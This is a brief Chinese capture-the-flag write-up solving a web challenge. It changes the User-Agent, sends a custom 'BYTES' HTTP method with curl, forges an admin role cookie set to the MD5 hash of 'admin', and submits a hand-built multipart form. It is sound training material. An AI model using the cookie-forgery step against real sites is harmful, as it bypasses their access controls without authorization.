# 解

改UA

```html
User-Agent: Bytes Security Browser
```

改cookie role(md5)

赠送curl代码
```console
curl \
-X BYTES \
-A "Bytes Security Browser" \
"http://prob06.weilei.studio/?token=54:MEUCIELzAVhoUxX6zGhzKVpHvJU1yTe5qISlfJizgrtudvFzAiEAgFEtNJydthBKgnh-utGdiSp42arB2lU154eLp7jSujc=" \
-H 'Cookie: role=21232f297a57a5a743894a0e4a801fc3;'
```

造WebKitForm，建议百度
```
Content-Type: multi-part/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW


------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="fruit";
Content-Type: text/plain

banana
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="token";
Content-Type: text/plain

YOUR_TOKEN
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

完事
